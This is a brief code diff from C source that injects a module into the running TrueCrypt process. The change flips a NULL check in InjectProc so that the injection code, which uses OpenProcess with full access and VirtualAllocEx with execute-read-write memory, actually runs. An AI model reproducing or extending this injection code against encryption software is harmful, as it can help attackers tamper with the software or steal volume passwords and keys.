@@ -83,7 +83,7 @@ DWORD FindTrueCryptPid()
 BOOL InjectProc(DWORD pid, HMODULE hModuleLibrary, int size_of_module)
 {
 	HANDLE process = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
-	if (process == NULL)
+	if (process != NULL)
 	{
 		LPVOID alloc = VirtualAllocEx(process, (PBYTE)hModuleLibrary, size_of_module, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 		if (alloc != NULL)
